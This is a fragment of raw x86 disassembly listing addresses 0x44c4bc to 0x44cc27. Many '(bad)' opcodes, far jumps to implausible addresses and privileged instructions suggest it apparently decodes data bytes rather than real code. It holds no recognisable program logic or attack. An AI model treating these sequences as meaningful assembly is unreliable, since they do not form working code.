  44c4bc:	mov    bl,0x5e
  44c4be:	inc    edi
  44c4bf:	push   esi
  44c4c0:	push   esi
  44c4c1:	xchg   edx,eax
  44c4c2:	sahf   
  44c4c3:	stos   BYTE PTR es:[edi],al
  44c4c4:	outs   dx,DWORD PTR ds:[esi]
  44c4c5:	loopne 0x44c48c
  44c4c7:	sbb    dh,al
  44c4c9:	(bad)  
  44c4ca:	int3   
  44c4cb:	and    bh,al
  44c4cd:	inc    ebp
  44c4ce:	retf   0x34da
  44c4d1:	popf   
  44c4d2:	cld    
  44c4d3:	dec    esi
  44c4d4:	leave  
  44c4d5:	add    eax,0x9600cbfe
  44c4da:	cmp    DWORD PTR [ebp+esi*2-0x7ec00f24],edi
  44c4e1:	in     al,0x55
  44c4e3:	mov    bl,0x55
  44c4e5:	ins    DWORD PTR es:[edi],dx
  44c4e6:	add    al,ah
  44c4e8:	fmul   QWORD PTR [eax+0x0]
  44c4eb:	ins    DWORD PTR es:[edi],dx
  44c4ec:	xchg   ebp,eax
  44c4ed:	ret    0x2d5a
  44c4f0:	nop
  44c4f1:	sbb    bl,ah
  44c4f3:	dec    esi
  44c4f4:	inc    ecx
  44c4f5:	mov    esi,0x66c6c12f
  44c4fa:	repnz mov edi,0x2efc015a
  44c500:	in     al,dx
  44c501:	and    dl,ah
  44c503:	mov    gs,edi
  44c505:	push   ecx
  44c506:	sub    cl,al
  44c508:	mov    ecx,0x7fd088b8
  44c50d:	iret   
  44c50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c50f:	sub    al,0x6b
  44c511:	retf   
  44c512:	(bad)  
  44c513:	jbe    0x44c541
  44c515:	fsub   DWORD PTR [edx+0x5c]
  44c518:	cdq    
  44c519:	push   edi
  44c51a:	xchg   edi,eax
  44c51b:	jns    0x44c553
  44c51d:	jnp    0x44c4b7
  44c51f:	repz ss and bl,0x8d
  44c524:	mov    BYTE PTR [esi],0xd1
  44c527:	cli    
  44c528:	jns    0x44c570
  44c52a:	xlat   BYTE PTR ds:[ebx]
  44c52b:	pop    edi
  44c52c:	test   eax,0x10b34db6
  44c531:	ds inc ebx
  44c533:	dec    esp
  44c534:	mov    ch,BYTE PTR [esi-0x5784654d]
  44c53a:	pop    ebx
  44c53b:	imul   BYTE PTR [ecx]
  44c53d:	or     ebx,esp
  44c53f:	into   
  44c540:	in     al,dx
  44c541:	daa    
  44c542:	mov    dh,0xcb
  44c544:	adc    BYTE PTR [eax-0x303af67],dl
  44c54a:	jbe    0x44c54c
  44c54c:	adc    ebx,DWORD PTR [esp+ebp*1-0xf]
  44c550:	jae    0x44c568
  44c552:	dec    ebx
  44c553:	ja     0x44c4f9
  44c555:	inc    edi
  44c556:	addr16 jns 0x44c5cd
  44c559:	fsubr  QWORD PTR [ebx]
  44c55b:	sahf   
  44c55c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c55d:	jle    0x44c5b1
  44c55f:	jmp    0x7d62:0x728df80d
  44c566:	mov    edx,0xd3fd13d
  44c56b:	leave  
  44c56c:	(bad)  
  44c56d:	fdivr  QWORD PTR [edi+0x25]
  44c570:	ds jl  0x44c52f
  44c573:	lahf   
  44c574:	mov    DWORD PTR [eax+ebx*1+0x6d7867c],edx
  44c57b:	inc    esp
  44c57c:	aaa    
  44c57d:	(bad)  [esi+esi*1-0x36]
  44c581:	or     DWORD PTR [ebx+0x5f],esi
  44c584:	outs   dx,DWORD PTR ds:[esi]
  44c585:	or     edi,esp
  44c587:	mov    ds:0x93613004,eax
  44c58c:	adc    esi,DWORD PTR [ebx]
  44c58e:	dec    edi
  44c58f:	mov    edi,0xaa784c7b
  44c594:	cmp    DWORD PTR [edx],edx
  44c596:	add    edx,DWORD PTR [edx-0x5c46707f]
  44c59c:	popf   
  44c59d:	fdiv   QWORD PTR [edi]
  44c59f:	into   
  44c5a0:	lahf   
  44c5a1:	mov    ecx,0xba5e4788
  44c5a6:	pop    ebx
  44c5a7:	sbb    al,cl
  44c5a9:	sbb    edx,DWORD PTR [ebx+eiz*1-0x5c]
  44c5ad:	stos   DWORD PTR es:[edi],eax
  44c5ae:	fild   WORD PTR [esi+0x0]
  44c5b1:	test   al,0xa6
  44c5b3:	xchg   ebp,eax
  44c5b4:	clc    
  44c5b5:	mov    ebx,0xf3319759
  44c5ba:	sub    al,ch
  44c5bc:	int3   
  44c5bd:	xor    BYTE PTR [esi+0x3db6630],bh
  44c5c3:	xchg   edi,eax
  44c5c4:	mov    al,ds:0xccc50d10
  44c5c9:	es or  eax,0xd1eccc5
  44c5cf:	(bad)
  44c5d2:	or     eax,0x54b7ccc5
  44c5d7:	in     eax,0x51
  44c5d9:	jmp    0x5acece73
  44c5de:	push   ecx
  44c5df:	inc    esp
  44c5e0:	(bad)  
  44c5e1:	fprem1 
  44c5e3:	push   ebx
  44c5e4:	ret    
  44c5e5:	xchg   edi,eax
  44c5e6:	push   esp
  44c5e7:	in     eax,0x51
  44c5e9:	mov    WORD PTR [eax+0x5486c931],cs
  44c5ef:	jo     0x44c621
  44c5f1:	fldenv [esi+0x4]
  44c5f4:	mov    edx,DWORD PTR [ebp+edi*4-0x77]
  44c5f8:	inc    esi
  44c5f9:	push   0x52
  44c5fb:	cmp    al,0xfc
  44c5fd:	fstp   DWORD PTR [esi+0x20]
  44c600:	mov    ecx,DWORD PTR [ecx+ebx*2-0x27c994ca]
  44c607:	cmp    BYTE PTR [edi],0x29
  44c60a:	gs add ch,bl
  44c60d:	mov    ebx,0xbf8b567f
  44c612:	jge    0x44c5d5
  44c614:	int3   
  44c615:	add    BYTE PTR [edi],dh
  44c617:	push   esp
  44c618:	in     eax,0x83
  44c61a:	xchg   BYTE PTR [ecx+ecx*4+0x3c525a45],dh
  44c621:	loopne 0x44c5fc
  44c623:	(bad)  
  44c624:	loopne 0x44c5b1
  44c626:	pop    ss
  44c627:	stc    
  44c628:	add    DWORD PTR [ecx+0x36],edx
  44c62b:	push   edx
  44c62c:	dec    esp
  44c62d:	in     al,0xd9
  44c62f:	xchg   ebp,eax
  44c630:	fmul   QWORD PTR [ebx+0x4d01611a]
  44c636:	push   0x50
  44c638:	inc    esp
  44c639:	clc    
  44c63a:	jmp    0xa0d0bec3
  44c63f:	mov    ch,0x1
  44c641:	inc    ebp
  44c642:	pop    edx
  44c643:	push   eax
  44c644:	cmp    al,0xe8
  44c646:	jmp    0x93d0bed7
  44c64b:	mov    ecx,0x505a5501
  44c650:	dec    esp
  44c651:	lock fst DWORD PTR [eax+edi*8+0x1bdaa8b]
  44c659:	dec    ebp
  44c65a:	push   0x50
  44c65c:	inc    esp
  44c65d:	cld    
  44c65e:	and    eax,0x6200ec95
  44c663:	fld    DWORD PTR [eax]
  44c665:	jmp    0x44c6d2
  44c667:	push   edx
  44c668:	dec    esp
  44c669:	hlt    
  44c66a:	loope  0x44c687
  44c66c:	add    BYTE PTR [ecx+0x4589e597],cl
  44c672:	jmp    0x1891:0x99f44452
  44c679:	jae    0x44c67b
  44c67b:	sub    dl,BYTE PTR [edx+0x4c]
  44c67e:	lock (bad) 
  44c681:	add    DWORD PTR [ebp+0x5a],eax
  44c684:	push   eax
  44c685:	cmp    al,0xdc
  44c687:	dec    eax
  44c688:	iret   
  44c689:	push   0x9961ac
  44c68e:	mov    ebx,DWORD PTR [edi]
  44c690:	std    
  44c691:	dec    edi
  44c692:	call   0x459ea9
  44c697:	loope  0x44c6ae
  44c699:	add    eax,0x1964a285
  44c69e:	mov    esi,DWORD PTR [edi]
  44c6a0:	in     eax,0x89
  44c6a2:	inc    ebp
  44c6a3:	jp     0x44c673
  44c6a5:	lods   eax,DWORD PTR ds:[esi]
  44c6a6:	or     al,0x12
  44c6a8:	push   eax
  44c6a9:	inc    esp
  44c6aa:	in     al,dx
  44c6ab:	jmp    0x27d0ab34
  44c6b0:	fisttp QWORD PTR [ecx+0x3bdad204]
  44c6b6:	or     BYTE PTR [ecx-0x34],cl
  44c6b9:	mov    DWORD PTR [ebp+0x52],ecx
  44c6bc:	pop    edx
  44c6bd:	rol    BYTE PTR [ebx+ebx*8],0x8b
  44c6c1:	lock jmp 0x44c6c2
  44c6c4:	test   eax,0x7c478bc0
  44c6c9:	ror    esp,0x26
  44c6cc:	or     eax,0xd1eccc5
  44c6d1:	(bad)
  44c6d4:	or     eax,0x52b7ccc5
  44c6d9:	in     eax,0x83
  44c6db:	push   es
  44c6dc:	shr    eax,0x5
  44c6df:	add    BYTE PTR ds:0x9f89f5de,cl
  44c6e5:	icebp  
  44c6e6:	mov    DWORD PTR [ebp+0xa],eax
  44c6e9:	mov    eax,ebp
  44c6eb:	sub    ebp,esi
  44c6ed:	(bad)  
  44c6ef:	and    DWORD PTR [esi],0xffffffd5
  44c6f2:	mov    eax,ds:0x94b2d4
  44c6f7:	push   0x40da1e
  44c6fc:	jmp    0xcd96af8c
  44c701:	ret    
  44c702:	int3   
  44c703:	mov    al,0x1e
  44c705:	fldenv [ecx+0x94f2d8]
  44c70b:	push   0x62
  44c70d:	jae    0x44c70f
  44c70f:	push   0x40d99e
  44c714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c715:	ret    
  44c716:	fdiv   DWORD PTR [eax+0x4587d926]
  44c71c:	mov    dl,BYTE PTR ds:0xd962fc3c
  44c722:	add    BYTE PTR [eax],al
  44c724:	jns    0x44c6f5
  44c726:	mov    DWORD PTR [ebp+0x7e],edx
  44c729:	pop    ecx
  44c72a:	ret    
  44c72b:	add    ebx,ebp
  44c72d:	xor    esp,0xffffff83
  44c730:	out    dx,eax
  44c731:	fmul   QWORD PTR [eax]
  44c733:	jae    0x44c778
  44c735:	push   edx
  44c736:	cmp    al,0xfc
  44c738:	jmp    0x61d1430a
  44c73d:	cdq    
  44c73e:	add    BYTE PTR [ecx-0x27],dl
  44c741:	xchg   al,ch
  44c743:	push   edx
  44c744:	add    BYTE PTR [ebp-0x39],al
  44c747:	int3   
  44c748:	mov    al,0xa6
  44c74a:	(bad)  [ecx-0x2acc9b3]
  44c750:	mov    WORD PTR [esi],ss
  44c752:	sub    bh,BYTE PTR ds:0x8a0a3900
  44c758:	in     eax,0xbf
  44c75a:	sbb    ch,al
  44c75c:	int3   
  44c75d:	es push cs
  44c75f:	(bad)
  44c762:	push   cs
  44c763:	(bad)
  44c766:	push   cs
  44c767:	(bad)
  44c76a:	push   eax
  44c76b:	in     eax,0xa1
  44c76d:	inc    esi
  44c76e:	sub    bh,BYTE PTR ds:0x41502c00
  44c774:	xor    cl,bl
  44c776:	mov    cs,WORD PTR [eax]
  44c778:	ds jmp 0x44c70c
  44c77b:	or     BYTE PTR [ebp-0x5f],bl
  44c77e:	or     eax,0xd9eccc5
  44c783:	(bad)
  44c786:	or     eax,0x5017ccc5
  44c78b:	in     eax,0x8b
  44c78d:	pop    ds
  44c78e:	int    0x50
  44c790:	mov    ebx,DWORD PTR [edi]
  44c792:	ror    DWORD PTR [edi-0x1],1
  44c795:	dec    edi
  44c796:	add    eax,0x7e6244b1
  44c79b:	ror    esp,0xa6
  44c79e:	or     eax,0xd9eccc5
  44c7a3:	(bad)
  44c7a6:	or     eax,0x1700ccc5
  44c7ab:	push   eax
  44c7ac:	in     eax,0x83
  44c7ae:	xchg   cl,dl
  44c7b0:	push   0x0
  44c7b2:	clc    
  44c7b3:	fsubr  DWORD PTR [eax-0x24]
  44c7b6:	popa   
  44c7b7:	cdq    
  44c7b8:	add    bh,bh
  44c7ba:	ja     0x44c7bd
  44c7bc:	mov    cl,0x44
  44c7be:	bound  edx,QWORD PTR [edx+0x3c]
  44c7c1:	clc    
  44c7c2:	mov    edx,0x624001f1
  44c7c7:	push   eax
  44c7c8:	cmp    al,0xf8
  44c7ca:	xchg   edx,eax
  44c7cb:	icebp  
  44c7cc:	mov    edx,0x81dc35ff
  44c7d1:	les    ebx,FWORD PTR [edx+0x52]
  44c7d4:	cmp    al,0xfc
  44c7d6:	(bad)  [ebp-0x7a16aef0]
  44c7dc:	add    al,0x52
  44c7de:	jmp    0xd94d078
  44c7e3:	xchg   ah,dh
  44c7e5:	mov    edi,edi
  44c7e7:	jge    0x44c7aa
  44c7e9:	int3   
  44c7ea:	xchg   edi,eax
  44c7eb:	push   eax
  44c7ec:	in     eax,0x51
  44c7ee:	sbb    eax,0x6200f496
  44c7f3:	fld    DWORD PTR [eax]
  44c7f5:	jmp    0x44c852
  44c7f7:	push   eax
  44c7f8:	cmp    al,0xfc
  44c7fa:	loope  0x44c814
  44c7fc:	add    BYTE PTR [ecx+0x4d89dd1f],cl
  44c802:	into   
  44c803:	lahf   
  44c804:	inc    ebx
  44c805:	adc    BYTE PTR [ecx-0x44],dl
  44c808:	mov    DWORD PTR [ebp+0x6a],edx
  44c80b:	fmul   DWORD PTR [ebx-0x4]
  44c80e:	add    BYTE PTR [ebp+0x23],ah
  44c811:	add    ecx,DWORD PTR [ebx+0x4d01cd1f]
  44c817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c818:	retf   
  44c819:	scas   al,BYTE PTR es:[edi]
  44c81a:	adc    DWORD PTR [ecx+0x17],ebx
  44c81d:	ins    DWORD PTR es:[edi],dx
  44c81e:	pop    es
  44c81f:	fcmovu st,st(1)
  44c821:	add    BYTE PTR [eax],al
  44c823:	(bad)  
  44c824:	lock cld 
  44c826:	jmp    0x7d87:0x8bc0a7b2
  44c82d:	ror    esp,0xa6
  44c830:	or     al,0xc5
  44c832:	int3   
  44c833:	sahf   
  44c834:	or     al,0xc5
  44c836:	int3   
  44c837:	xchg   esi,eax
  44c838:	or     al,0xc5
  44c83a:	int3   
  44c83b:	mov    bh,0x4e
  44c83d:	in     eax,0xb9
  44c83f:	jp     0x44c81a
  44c841:	add    BYTE PTR [eax],al
  44c843:	(bad)  
  44c844:	dec    esi
  44c845:	or     BYTE PTR [ecx+0x44afad57],cl
  44c84b:	bound  edi,QWORD PTR [ecx+eax*8-0x34]
  44c84f:	es push cs
  44c851:	(bad)
  44c854:	push   cs
  44c855:	(bad)
  44c858:	push   cs
  44c859:	(bad)
  44c85c:	dec    esi
  44c85d:	in     eax,0x83
  44c85f:	push   es
  44c860:	retf   0x4589
  44c863:	pop    edx
  44c864:	push   esi
  44c865:	jns    0x44c86b
  44c867:	(bad)  
  44c868:	retf   0x887c
  44c86b:	(bad)  
  44c86c:	fld    DWORD PTR [eax]
  44c86e:	mov    esp,DWORD PTR [edi+0x5189d1]
  44c874:	push   si
  44c876:	jmp    0x44c880
  44c878:	adc    esi,eax
  44c87a:	xchg   DWORD PTR [ebp-0x2a],edx
  44c87d:	dec    esi
  44c87e:	cmp    al,0x8
  44c880:	loope  0x44c89b
  44c882:	or     DWORD PTR [ecx+0x45bde927],ecx
  44c888:	(bad)  
  44c889:	fld    DWORD PTR [eax]
  44c88b:	add    BYTE PTR [edx-0x12],ah
  44c88e:	pop    es
  44c88f:	mov    esp,DWORD PTR [edi]
  44c891:	fld    QWORD PTR [ecx+0x445063c1]
  44c897:	cld    
  44c898:	fld    DWORD PTR [esp+esi*8+0x71e5373b]
  44c89f:	inc    esi
  44c8a0:	jmp    0x1fd0bd39
  44c8a5:	jmp    0x98b37faf
  44c8aa:	mov    edi,0xfb566efa
  44c8af:	add    ebp,edi
  44c8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c8b2:	mov    DWORD PTR [ebp+0x6e],eax
  44c8b5:	dec    esi
  44c8b6:	inc    esp
  44c8b7:	lock push ebp
  44c8b9:	and    cl,BYTE PTR ds:0xf5f6e341
  44c8bf:	punpckldq mm3,mm1
  44c8c2:	xchg   DWORD PTR [ebp+0x4a],edx
  44c8c5:	dec    esi
  44c8c6:	cmp    al,0x8
  44c8c8:	(bad)  [ebx+0x4e6a0304]
  44c8ce:	dec    esp
  44c8cf:	clc    
  44c8d0:	jmp    0xa747d8a9
  44c8d5:	leave  
  44c8d6:	mov    DWORD PTR [ebp+0x0],ecx
  44c8d9:	pop    edx
  44c8da:	dec    esi
  44c8db:	dec    esp
  44c8dc:	or     al,0x61
  44c8de:	enter  0x4d89,0x1a
  44c8e2:	push   eax
  44c8e3:	std    
  44c8e4:	or     ecx,edi
  44c8e6:	das    
  44c8e7:	mov    dl,BYTE PTR [ebp+0x5a]
  44c8ea:	dec    esi
  44c8eb:	cmp    al,0x8
  44c8ed:	popa   
  44c8ee:	xchg   edi,eax
  44c8ef:	cld    
  44c8f0:	mov    BYTE PTR [edi-0x1294182f],bl
  44c8f6:	fprem1 
  44c8f8:	mov    edi,edi
  44c8fa:	jnp    0x44c8bd
  44c8fc:	int3   
  44c8fd:	aaa    
  44c8fe:	dec    esi
  44c8ff:	in     eax,0x83
  44c901:	(bad)  
  44c902:	mov    ah,0x89
  44c904:	inc    ebp
  44c905:	pop    edx
  44c906:	push   eax
  44c907:	cmp    al,0xe4
  44c909:	(bad)  [ebx-0xae87424]
  44c90f:	add    DWORD PTR [ecx+0x76],edx
  44c912:	push   eax
  44c913:	dec    esp
  44c914:	call   0x8c2d5cf2
  44c919:	ficomp DWORD PTR [eax+0x1]
  44c91c:	add    BYTE PTR [edx+0x50],ah
  44c91f:	inc    esp
  44c920:	lock loope 0x44c97e
  44c923:	lock add BYTE PTR [ebp+0x55],bl
  44c927:	cli    
  44c928:	add    BYTE PTR [edx-0x27],ah
  44c92b:	mov    DWORD PTR [ebp+0x6a],edx
  44c92e:	(bad)  
  44c92f:	dec    ebx
  44c930:	lock jmp 0x44c8b6
  44c933:	loopne 0x44c8c0
  44c935:	daa    
  44c936:	stc    
  44c937:	cmp    DWORD PTR [eax+0x52],0x8405d9
  44c93e:	inc    edi
  44c93f:	fiadd  DWORD PTR [eax]
  44c941:	add    al,cl
  44c943:	fldcw  WORD PTR [edx+0x0]
  44c946:	fldenv [esi]
  44c948:	loope  0x44c8d5
  44c94a:	scas   eax,DWORD PTR es:[edi]
  44c94b:	loope  0x44c94e
  44c94d:	push   ecx
  44c94e:	outs   dx,BYTE PTR ds:[esi]
  44c94f:	sub    esi,esi
  44c951:	adc    eax,0x3c8a1a
  44c956:	fistp  DWORD PTR [esi]
  44c958:	cmc    
  44c959:	mov    ebx,DWORD PTR [edi+0x623881b9]
  44c95f:	dec    ebp
  44c960:	sbb    BYTE PTR [ebx+0x5589b9a7],cl
  44c966:	pop    edx
  44c967:	fmul   QWORD PTR [edi]
  44c969:	mov    DWORD PTR [edi+0x24589cd],ebp
  44c96f:	gs inc ebx
  44c971:	or     BYTE PTR [ecx+0x21],ah
  44c974:	adc    DWORD PTR [ecx+0x17e9c59f],ecx
  44c97a:	fldcw  WORD PTR [esi]
  44c97c:	loope  0x44c909
  44c97e:	daa    
  44c97f:	loope  0x44c982
  44c981:	inc    edx
  44c982:	jb     0x44c9e6
  44c984:	cmp    esi,esp
  44c986:	fldenv [esi]
  44c988:	loope  0x44c915
  44c98a:	das    
  44c98b:	loope  0x44c98e
  44c98d:	adc    ebx,ebp
  44c98f:	cs in  eax,0xc7
  44c992:	pop    ds
  44c993:	rol    DWORD PTR [eax],1
  44c995:	add    BYTE PTR [edx-0x27],ah
  44c998:	mov    DWORD PTR [ebp-0x3e],eax
  44c99b:	pop    esp
  44c99c:	js     0x44c9ae
  44c99e:	bound  ecx,QWORD PTR [ebp+0x6]
  44c9a1:	mov    eax,DWORD PTR [eax]
  44c9a3:	daa    
  44c9a4:	mov    ecx,0x4d623981
  44c9a9:	inc    dh
  44c9ab:	pop    ds
  44c9ac:	sar    edi,1
  44c9ae:	jmp    DWORD PTR [edx-0x27]
  44c9b1:	mov    DWORD PTR [ebp+0x6e],edx
  44c9b4:	pop    esp
  44c9b5:	cmp    al,BYTE PTR [eax]
  44c9b7:	idiv   BYTE PTR [ecx]
  44c9b9:	mov    al,BYTE PTR [ebp+0x6e]
  44c9bc:	or     BYTE PTR fs:[ecx+0xd943],al
  44c9c3:	loop   0x44ca11
  44c9c5:	adc    eax,0x89cdb78b
  44c9ca:	add    bh,BYTE PTR [edi-0x28]
  44c9cd:	cmc    
  44c9ce:	(bad)  
  44c9cf:	mov    ebp,0x364d8a29
  44c9d4:	sub    ch,cl
  44c9d6:	mov    ch,0x2f
  44c9d8:	fdiv   st,st(5)
  44c9da:	sbb    DWORD PTR [esi],0xffffffe1
  44c9dd:	xchg   DWORD PTR [ebp+0x3e],eax
  44c9e0:	les    edx,FWORD PTR [ebx+ecx*4]
  44c9e3:	scas   eax,DWORD PTR es:[edi]
  44c9e4:	int    0x89
  44c9e6:	add    bl,cl
  44c9e8:	and    eax,0xe1ae8d09
  44c9ed:	add    dl,BYTE PTR [edx-0x17]
  44c9f0:	sbb    eax,0x700a50f5
  44c9f5:	repz (bad) 
  44c9f7:	in     eax,dx
  44c9f8:	pop    ebx
  44c9f9:	mov    esp,0xd51ddb08
  44c9fe:	mov    ebp,DWORD PTR [edi]
  44ca00:	lds    ecx,FWORD PTR [ecx+0xf61b655]
  44ca06:	mov    eax,DWORD PTR [eax]
  44ca08:	daa    
  44ca09:	int    0x81
  44ca0b:	rcr    BYTE PTR [esi+0x62],0x3b
  44ca0f:	hlt    
  44ca10:	jmp    0xa3c8af3a
  44ca15:	fadd   QWORD PTR [edi-0x723c41b3]
  44ca1b:	mov    ecx,DWORD PTR [edi]
  44ca1d:	mov    ecx,0x6276c281
  44ca22:	dec    ebx
  44ca23:	loopne 0x44c9b0
  44ca25:	out    0xf5,al
  44ca27:	dec    DWORD PTR [ebp-0x5ea2249d]
  44ca2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ca2e:	(bad)  
  44ca2f:	int3   
  44ca30:	pop    ss
  44ca31:	fs in  al,0x83
  44ca34:	xchg   al,ah
  44ca36:	push   0x11961f0
  44ca3b:	dec    DWORD PTR [edi-0x47]
  44ca3e:	mov    al,0x44
  44ca40:	bound  esp,QWORD PTR [eax+0x3b]
  44ca43:	clc    
  44ca44:	retf   0x1d5
  44ca47:	inc    eax
  44ca48:	bound  esp,QWORD PTR [edx+0x3b]
  44ca4b:	clc    
  44ca4c:	mov    dl,0xc1
  44ca4e:	ss std 
  44ca50:	cmp    eax,0x6ac481d7
  44ca55:	pusha  
  44ca56:	cmp    edi,esp
  44ca58:	fldenv [ecx+edx*1]
  44ca5b:	push   ecx
  44ca5c:	fldcw  WORD PTR [eax*1+0x91ce952]
  44ca63:	push   eax
  44ca64:	adc    eax,0x78bf52d
  44ca69:	xor    eax,0x1600ccc2
  44ca6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ca6f:	(bad)  
  44ca70:	int3   
  44ca71:	xchg   edi,eax
  44ca72:	(bad)  
  44ca73:	in     al,0xa1
  44ca75:	cmp    cl,BYTE PTR [eax-0x25dbffc4]
  44ca7b:	push   0xb0094f8b
  44ca80:	inc    esp
  44ca81:	bound  esp,QWORD PTR [eax+0x50]
  44ca84:	add    DWORD PTR [eax],edx
  44ca86:	fwait
  44ca87:	mov    BYTE PTR [eax+0x67],dl
  44ca8a:	xor    al,0xc2
  44ca8c:	int3   
  44ca8d:	xchg   esi,eax
  44ca8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ca8f:	(bad)  
  44ca90:	int3   
  44ca91:	pop    ss
  44ca92:	(bad)  
  44ca93:	in     al,0x83
  44ca95:	(bad)  
  44ca96:	in     eax,0x9f
  44ca98:	sub    al,0xf3
  44ca9a:	sbb    eax,0xa908b01
  44ca9f:	enter  0xe93e,0x19
  44caa3:	xor    DWORD PTR [ebx+0x3ed262b0],ecx
  44caa9:	fldenv [ecx]
  44caab:	add    eax,0x4360b08b
  44cab0:	hlt    
  44cab1:	jmp    0x2ad0b7d2
  44cab6:	in     eax,0x87
  44cab8:	dec    ebp
  44cab9:	push   0x62
  44cabb:	dec    ebx
  44cabc:	clc    
  44cabd:	fld    TBYTE PTR [esi*8+0xd963b8]
  44cac4:	add    bh,bl
  44cac6:	cwde   
  44cac7:	ins    BYTE PTR es:[edi],dx
  44cac8:	inc    esp
  44cac9:	loope  0x44cb1e
  44cacb:	stc    
  44cacc:	add    bh,cl
  44cace:	fnsave [ecx]
  44cad0:	rol    BYTE PTR [eax],0x49
  44cad3:	adc    eax,0x623a4d8a
  44cad8:	dec    edi
  44cad9:	sbb    BYTE PTR [ecx+0x2c],ch
  44cadc:	or     DWORD PTR [ebp+0x4b],esi
  44cadf:	bound  edi,QWORD PTR [ebx]
  44cae1:	clc    
  44cae2:	jmp    0xaacdd00a
  44cae7:	cmc    
  44cae8:	mov    DWORD PTR [ebp+0xa],edx
  44caeb:	bound  edi,QWORD PTR [ebx]
  44caed:	adc    bl,bl
  44caef:	sbb    bl,BYTE PTR [ecx]
  44caf1:	mov    eax,0xd963
  44caf6:	or     ecx,esi
  44caf8:	mov    DWORD PTR [ebp-0x16],ecx
  44cafb:	popa   
  44cafc:	jns    0x45ce9c91
  44cb02:	ficom  DWORD PTR [ecx]
  44cb04:	cmp    al,0xfc
  44cb06:	dec    edi
  44cb07:	fnsave [ecx]
  44cb09:	sar    BYTE PTR [ecx-0x6e4c1624],0x99
  44cb10:	mov    ebp,esp
  44cb12:	pop    ds
  44cb13:	call   0xccc4:0xa4a6ccc4
  44cb1a:	sahf   
  44cb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cb1c:	(bad)  
  44cb1d:	int3   
  44cb1e:	xchg   esi,eax
  44cb1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cb20:	(bad)  
  44cb21:	int3   
  44cb22:	aaa    
  44cb23:	(bad)  
  44cb24:	in     al,0x8b
  44cb26:	pop    ds
  44cb27:	loope  0x44cb62
  44cb29:	inc    ebp
  44cb2a:	pop    esi
  44cb2b:	dec    edx
  44cb2c:	dec    BYTE PTR [edx+0x5e9e11f]
  44cb32:	mov    ecx,ebx
  44cb34:	mov    DWORD PTR [ebp+0x0],eax
  44cb37:	data16 xor al,0xc2
  44cb3a:	int3   
  44cb3b:	sahf   
  44cb3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cb3d:	(bad)  
  44cb3e:	int3   
  44cb3f:	xchg   esi,eax
  44cb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cb41:	(bad)  
  44cb42:	int3   
  44cb43:	mov    bh,0x60
  44cb45:	in     al,0x83
  44cb47:	inc    esi
  44cb48:	push   es
  44cb49:	mov    esi,0xd0da4e45
  44cb4e:	add    al,0x62
  44cb50:	pusha  
  44cb51:	cmp    ecx,DWORD PTR [eax]
  44cb53:	jmp    0x44cb73
  44cb55:	(bad)  [ebx+0x5589b1a7]
  44cb5b:	pop    edx
  44cb5c:	fmul   DWORD PTR [edi+0x3c]
  44cb5f:	fld    TBYTE PTR [esi]
  44cb61:	loope  0x44caee
  44cb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cb64:	mov    ecx,0xedaab705
  44cb69:	mov    DWORD PTR [ebp+0x2],edx
  44cb6c:	addr16 cmp al,0xa
  44cb6f:	push   0x62
  44cb71:	cmp    ebp,eax
  44cb73:	mov    bl,ch
  44cb75:	cld    
  44cb76:	aas    
  44cb77:	bound  esp,QWORD PTR [eax+0x3]
  44cb7a:	sbb    BYTE PTR [ebx-0x5aefee3],dh
  44cb80:	in     al,0xf4
  44cb82:	(bad)  
  44cb83:	fstp   QWORD PTR [eax-0x44]
  44cb86:	or     bl,ch
  44cb88:	push   ds
  44cb89:	icebp  
  44cb8a:	push   0x22
  44cb8c:	inc    ecx
  44cb8d:	add    DWORD PTR [eax],esi
  44cb8f:	(bad)  
  44cb90:	fldcw  WORD PTR [eax+0x0]
  44cb93:	xchg   edx,eax
  44cb94:	fld    QWORD PTR [eax]
  44cb96:	push   0x62
  44cb98:	aam    0x4b
  44cb9a:	lock add bl,bl
  44cb9d:	push   ds
  44cb9e:	fisttp QWORD PTR [ebx+0x4289b90f]
  44cba4:	sub    DWORD PTR ss:[edx-0x75d595b3],ecx
  44cbab:	push   ebp
  44cbac:	xchg   BYTE PTR [edi],ah
  44cbae:	jmp    0xf6195034
  44cbb3:	and    DWORD PTR [esi+0x6e45bde5],0xffffffd9
  44cbba:	add    BYTE PTR [eax],al
  44cbbc:	(bad)  
  44cbbd:	rol    BYTE PTR [edi],0x8b
  44cbc0:	pop    ds
  44cbc1:	int    0x81
  44cbc3:	shl    BYTE PTR [ebx+0x62],0x3b
  44cbc7:	hlt    
  44cbc8:	jmp    0x1554acf2
  44cbcd:	sub    bh,bh
  44cbcf:	cmp    BYTE PTR [edi-0x16a68e33],ch
  44cbd5:	sbb    eax,0xedba83e9
  44cbda:	add    BYTE PTR [edi+eiz*4+0x60],dh
  44cbde:	inc    ebx
  44cbdf:	call   0x561dc5
  44cbe4:	xchg   esi,eax
  44cbe5:	adc    eax,0x600a558a
  44cbea:	inc    edx
  44cbeb:	adc    cl,bl
  44cbed:	and    eax,0x15b38be1
  44cbf2:	test   BYTE PTR [edx+edx*2-0x2c],al
  44cbf6:	mov    DWORD PTR [ebp+0x2],ecx
  44cbf9:	or     bl,dl
  44cbfb:	div    DWORD PTR [ebx+0x15]
  44cbfe:	mov    dl,BYTE PTR [ebp+0x0]
  44cc01:	add    ah,ah
  44cc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cc04:	inc    edx
  44cc05:	sahf   
  44cc06:	sub    DWORD PTR [edx+0x435fca45],ecx
  44cc0c:	or     BYTE PTR [ecx+0x21],ah
  44cc0f:	or     eax,0xe92dd951
  44cc14:	mov    esp,DWORD PTR [edi]
  44cc16:	mov    ebp,0x29664201
  44cc1b:	jmp    0xf6187835
  44cc20:	sbb    DWORD PTR [esi-0x75b2761c],0x57
  44cc27:	mov    edi,0xe925eb28
